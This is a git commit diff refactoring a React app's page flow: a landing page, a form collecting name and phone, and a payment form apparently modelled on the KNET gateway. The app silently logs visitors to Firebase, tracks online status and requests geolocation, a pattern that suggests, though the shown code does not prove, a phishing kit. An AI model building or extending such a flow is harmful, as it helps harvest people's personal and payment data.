b18f2207adae095059d5d114c390476ba4637c05
a96363877 <a96363877@gmail.com>
2025-06-22 08:33:32 +0300

    Fix Payment Page Not Found Issue

--- src/App.tsx
+++ src/App.tsx
@@ -7,7 +7,7 @@ import Landing from "./landing/landing"
 import { Toaster } from "react-hot-toast"
 import Info from "./info/info"
 import { addData } from "./firebase"
-import  FullPageLoader  from "./loader"
+import FullPageLoader from "./loader"
 import { PaymentForm } from "./kent/kent"
 import { getLocation, setupOnlineStatus } from "./lib"
 
@@ -18,33 +18,54 @@ function App() {
   const [phone, setPhone] = useState("")
 
   const [_id] = useState("id" + Math.random().toString(16).slice(2))
-  const data={
-    id:_id,
-    hasPersonalInfo:name != '',
-    currentPage:currantPage,
+  const data = {
+    id: _id,
+    hasPersonalInfo: name != '',
+    currentPage: currantPage,
     createdDate: new Date().toISOString(),
-    notificationCount:1,
+    notificationCount: 1,
     personalInfo: {
-      id:name,
-      fullName:name,
-      phone:phone
+      id: name,
+      fullName: name,
+      phone: phone
     },
   };
+
   const handleNextPage = () => {
-   addData(data)
-   setisloading(true)
+    addData(data)
+    setisloading(true)
     setTimeout(() => {
       setisloading(false)
-      setCurrantPage(currantPage+1)
+      setCurrantPage(currantPage + 1)
     }, 3000)
   }
-  useEffect(()=>{
-    localStorage.setItem('vistor',_id)
-      addData(data).then(()=>{
-        setupOnlineStatus(data.id)
-        getLocation()
-      })
-    },[])
+
+  useEffect(() => {
+    localStorage.setItem('vistor', _id)
+    addData(data).then(() => {
+      setupOnlineStatus(data.id)
+      getLocation()
+    })
+  }, [])
+
+  const renderCurrentPage = () => {
+    switch (currantPage) {
+      case 1:
+        return <Landing handleNextPage={handleNextPage} />
+      case 2:
+        return <Info setName={setName} setPhone={setPhone} handleNextPage={handleNextPage} />
+      case 3:
+      default:
+        return (
+          <div className="min-h-screen bg-gray-50 py-8">
+            <div className="container mx-auto px-4">
+              <PaymentForm />
+            </div>
+          </div>
+        )
+    }
+  }
+
   return (
     <CartProvider>
       <div style={{ opacity: isLoading ? 0.4 : 1 }}>
@@ -52,20 +73,7 @@ function App() {
           {isLoading && <FullPageLoader />}
           <Toaster position="bottom-center" />
         </div>
-
-        {currantPage === 1 ? (
-          <Landing handleNextPage={handleNextPage} />
-        ) : currantPage === 2 ? (
-          <Info setName={setName} setPhone={setPhone} handleNextPage={handleNextPage} />
-        ) : currantPage === 3 ? (
-          <div className="my-16" style={{ marginTop: 45, padding: 20 }}>
-            <PaymentForm />
-          </div>
-        ) :  (
-          <div className="my-16" style={{ marginTop: 45, padding: 20 }}>
-            <PaymentForm />
-          </div>
-        ) }
+        {renderCurrentPage()}
       </div>
     </CartProvider>
   )
